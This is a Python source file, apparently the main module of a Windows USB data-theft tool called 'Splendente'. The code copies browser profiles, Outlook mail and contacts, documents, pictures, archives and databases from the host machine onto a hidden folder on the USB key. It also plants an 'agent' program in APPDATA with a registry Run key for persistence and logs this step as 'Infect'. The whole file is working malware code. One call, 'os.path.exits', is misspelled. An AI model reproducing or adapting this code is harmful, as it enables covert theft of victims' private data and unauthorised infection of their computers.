 # -*- coding: utf-8 -*-

"""



      *******               ***                                 **                                                      ***** *    **         *******         ***** **
    *       ***              ***                                 **                              *                   ******  *  *****       *       ***    ******  ***
   *         **               **                                 **                             **                  **   *  *     *****    *         **   **   *  * **
   **        *                **                                 **                             **                 *    *  **     * **     **        *   *    *  *  **
    ***             ****      **                                 **                           ********                 *  ***     *         ***              *  *   *
   ** ***          * ***  *   **       ***    ***  ****      *** **      ***    ***  ****    ********     ***         **   **     *        ** ***           ** **  *
    *** ***       *   ****    **      * ***    **** **** *  *********   * ***    **** **** *    **       * ***        **   **     *         *** ***         ** ** *
      *** ***    **    **     **     *   ***    **   ****  **   ****   *   ***    **   ****     **      *   ***       **   **     *           *** ***       ** ***
        *** ***  **    **     **    **    ***   **    **   **    **   **    ***   **    **      **     **    ***      **   **     *             *** ***     ** ** ***
          ** *** **    **     **    ********    **    **   **    **   ********    **    **      **     ********       **   **     *               ** ***    ** **   ***
           ** ** **    **     **    *******     **    **   **    **   *******     **    **      **     *******         **  **     *                ** **    *  **     **
            * *  **    **     **    **          **    **   **    **   **          **    **      **     **               ** *      *                 * *        *      **
  ***        *   *******      **    ****    *   **    **   **    **   ****    *   **    **      **     ****    *         ***      *       ***        *     ****     ***
 *  *********    ******       *** *  *******    ***   ***   *****      *******    ***   ***      **     *******           ********       *  *********     *  ********
*     *****      **            ***    *****      ***   ***   ***        *****      ***   ***             *****              ****        *     *****      *     ****
*                **                                                                                                                     *                *
 **              **                                                                                                                      **               **
                  **




"""

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import win32api
import win32con
import os
import logging
import re
import glob
import shutil
import sys

from splendenteDirs import TargetDirectories
from splendenteConf import ExtConf, DirsConf
from splendenteUtils import Date, SmallSize, MediumSize, HighSize, BigSize
from splendenteMount import TargetMount, UsbMount
from splendenteCopy import Copy
from splendentePersistence import Persistence

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

searchUsbMountLetter = UsbMount.SearchUsbMountLetter()
platform = sys.platform

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    if platform == "win32":
        # -- Check if your USB key (USB_DATA) is mounted -- #
        if searchUsbMountLetter != None:

            # -- Check if log file is available on USB key -- #
            if os.path.exists("{0}\\log\\splendente.log".format(searchUsbMountLetter)) == True:

                # -- Define log file -- #
                logFile = "{0}\\log\\splendente.log".format(searchUsbMountLetter)
                logging.basicConfig(
                                    filename=logFile,
                                    level=logging.DEBUG,
                                    format="%(name)s - %(levelname)s -> %(message)s"
                                    )

                # -- Delete old data in log file on USB key --#
                open(logFile, "w").close()
                if os.path.getsize(logFile) == 0:
                    logging.info("Clear : Old {0} -> deleted".format(logFile))

                # -- Check if conf file is available on USB key -- #
                if os.path.exists(searchUsbMountLetter + "\\conf" + "\\splendente.ini") == True:
                    confUsbDirectory = searchUsbMountLetter + "\\conf" + "\\splendente.ini"

                    # --- Name of folder that will contain all data in USB key --- #
                    dataUsbDirectory = "{0}\\data_{1}".format(searchUsbMountLetter, Date())
                    os.makedirs(dataUsbDirectory)

                    # -- Check if data folder is available on USB key -- #    
                    if os.path.exits(dataUsbDirectory) == True:

                        # --- Found directories on target --- #
                        targetDirectoriesFound = TargetDirectories.DirectoryFound(DirsConf.Directories(confUsbDirectory),"Target",TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
                        for i in targetDirectoriesFound:
                            if i != None:
                                logging.info("Found : {0}".format(i))

                        # --- Create folders in USB that will found on target --- #
                        usbDirectories = TargetDirectories.DirectoryFound(DirsConf.Directories(confUsbDirectory),"USB", TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
                        for i in usbDirectories:
                            if i != None:
                                os.makedirs("{0}\\{1}".format(dataUsbDirectory, i))

                        # --- Check if agent directory is available on USB key --- #
                        if os.path.exists("{0}\\agent".format(searchUsbMountLetter)) == True:

                            # --- Files copy from USB key --- #
                            agentUsbDirectory = "{0}\\agent".format(searchUsbMountLetter)
                            try:
                                infectTarget = Persistence(agentUsbDirectory)

                                if infectTarget == 1:
                                    logging.info("Infect : Not file in {0} / Error when copying".format(agentUsbDirectory))
                                else:
                                    logging.info("Infect : File upload from  {0} to {1} -> successful".format(agentUsbDirectory, os.environ["APPDATA"] + "\\Microsoft"))
                                    logging.info("Infect : Add Register {0}\\'program_copied' pointed to {1}\\'program_copied' from {2} -> successfull".format("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", os.environ["APPDATA"] + "\\Microsoft", agentUsbDirectory))

                            except Exception as e:
                                logging.error(e)
                                pass
                        else:
                            logging.info("No {0}\\agent directory".format(searchUsbMountLetter))

                        # -- Files copy from target -- #
                        for usbFolder in usbDirectories:
                            for targetPath in targetDirectoriesFound:

                                # -- Folders of user profile and other partitions mounted -- #
                                if usbFolder in targetPath:
                                    usbFolderFound = dataUsbDirectory + "\\" + usbFolder

                                    if re.match(r"(^Chrome$)", usbFolder):
                                        Copy.MediumDepth(ExtConf.ChromeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"(^Firefox$)", usbFolder):
                                        Copy.MediumDepth(ExtConf.FirefoxBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"(^Outlook$)|(^Contacts$)", usbFolder):
                                        Copy.MediumDepth(ExtConf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    elif re.match(r"(^Pictures$)", usbFolder):
                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    elif re.match(r"(^Documents$)|(^Downloads$)|(^Desktop$)|(^Dropbox$)|(^OneDrive$)", usbFolder):
                                        Copy.HighDepth(ExtConf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(ExtConf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(ExtConf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"^\D?$", usbFolder) and os.environ["USERPROFILE"] not in targetPath:
                                        Copy.HighDepth(ExtConf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(ExtConf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(ExtConf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    else:
                                        continue

                                    if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                        logging.info("Copy : {0} -> successful".format(usbFolderFound))
                                    else:
                                        # -- Remove folder empty in USB key -- #
                                        try:
                                            shutil.rmtree(usbFolderFound)
                                            if os.path.exists(usbFolderFound) == False:
                                                logging.info("Remove : {0} -> no data".format(usbFolderFound))
                                        except Exception as e:
                                            pass

                                # -- UserProfile Only -- #
                                elif re.match(r"(^WindowsHome$)", usbFolder) and targetPath == os.environ["USERPROFILE"]:
                                    usbFolderFound = dataUsbDirectory + "\\" + usbFolder

                                    Copy.SmallDepth(ExtConf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                    Copy.SmallDepth(ExtConf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                    Copy.SmallDepth(ExtConf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                    Copy.SmallDepth(ExtConf.Compress(confUsbDirectory), usbFolderFound, targetPath, HighSize())

                                    if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                        logging.info("Copy : {0} -> successful".format(usbFolderFound))
                                    else:
                                        # -- Remove folder empty in USB key -- #
                                        try:
                                            shutil.rmtree(usbFolderFound)
                                            if os.path.exists(usbFolderFound) == False:
                                                logging.info("Remove : {0} -> no data".format(usbFolderFound))
                                        except Exception as e:
                                            pass
                                else:
                                    continue

                        # -- Set the folder in hidden mode containing the copied files -- #
                        win32api.SetFileAttributes(dataUsbDirectory, win32con.FILE_ATTRIBUTE_HIDDEN)
                    else:
                        logging.error("No {0}\\data directory".format(searchUsbMountLetter))
                else:
                    logging.error("No {0}\\conf\\splendente.ini".format(searchUsbMountLetter))
                    sys.exit(0)
            else:
                sys.exit(0)
        else:
            sys.exit(0)
    else:
        sys.exit(0)

#---------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
